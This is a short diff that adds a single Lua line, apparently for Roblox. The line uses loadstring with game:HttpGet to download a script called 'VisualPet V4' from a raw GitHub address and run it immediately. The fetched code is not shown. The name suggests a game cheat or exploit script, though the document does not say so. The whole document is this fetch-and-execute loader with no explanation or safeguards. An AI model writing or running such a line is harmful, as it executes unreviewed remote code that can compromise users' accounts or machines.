@@ -1,0 +1,4 @@
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SkylineUser0/lol/main/VisualPet%20V4.txt", true))()
+
